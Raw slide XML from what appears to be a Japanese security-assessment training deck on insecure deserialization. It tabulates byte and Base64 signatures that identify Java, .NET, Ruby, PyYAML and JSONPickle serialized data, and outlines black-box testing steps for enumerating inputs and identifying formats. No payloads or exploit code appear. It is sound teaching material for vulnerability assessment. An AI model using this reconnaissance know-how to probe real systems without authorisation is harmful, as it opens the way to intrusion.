                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>JSONPickle</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>["Test", "Data", [4], "ACADEMY"]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>PyYAML / ruamel.yaml</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>- Test\n- Data\n- - 4\n- ACADEMY</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Java</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>AC ED 00 05 73 72 （Base64: rO0ABXNy）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>C# / .NET</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>00 01 00 00 00 ff ff ff ff （Base64: AAEAAAD/////）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Ruby</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>04 08 で始まる</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="143946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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02 / 脆弱性の特定</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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ブラックボックス診断の調査プロセス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1558925"/>
            <a:ext cx="2025650" cy="1390650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="946150" y="1714500"/>
            <a:ext cx="1818259" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="946150" y="1968500"/>
            <a:ext cx="1818259" cy="200620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>入力点の列挙</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="946150" y="2219920"/>
            <a:ext cx="1818259" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Import/Export/Cookie/Session/API/Upload を洗い出す</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2949575" y="1558925"/>
            <a:ext cx="2025650" cy="1390650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3079750" y="1714500"/>
            <a:ext cx="1818259" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3079750" y="1968500"/>
            <a:ext cx="1818259" cy="200620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>形式の識別</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3079750" y="2219920"/>
            <a:ext cx="1818259" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>デコードしシグネチャと照合。根拠を記録する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5083175" y="1558925"/>
            <a:ext cx="2025650" cy="1390650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5213350" y="1714500"/>
            <a:ext cx="1818259" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5213350" y="1968500"/>
            <a:ext cx="1818259" cy="200620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>正常系の把握</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5213350" y="2219920"/>
            <a:ext cx="1818259" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>値を変えずに送り、通常のレスポンス・挙動を基準化する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7216775" y="1558925"/>
            <a:ext cx="2025650" cy="1390650"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6164"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
